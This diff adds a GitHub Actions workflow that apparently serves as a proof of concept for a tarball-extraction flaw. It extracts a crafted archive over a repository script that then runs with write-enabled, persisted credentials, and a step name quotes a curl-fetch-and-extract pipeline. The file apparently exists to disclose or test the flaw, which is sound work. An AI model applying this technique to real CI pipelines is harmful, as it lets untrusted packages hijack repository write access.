@@ -1,0 +1,23 @@
+name: poc-tarball-extraction
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  add-to-registry:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository (same shape as add-to-registry: credentials persisted)
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Before
+        run: |
+          echo "sha_before=$(sha256sum src/add-to-registry.js | cut -d' ' -f1)"
+          node src/add-to-registry.js
+      - name: Simulate `npm v <pkg> dist.tarball | xargs curl | tar -xz` then `node src/add-to-registry.js`
+        run: |
+          python3 .poc/make-tarball.py
+          cat pkg.tgz | tar -xz
+          echo "sha_after=$(sha256sum src/add-to-registry.js | cut -d' ' -f1)"
+          node src/add-to-registry.js "$GITHUB_WORKSPACE/package" https://github.com/poc/poc-tpl poc-tpl true
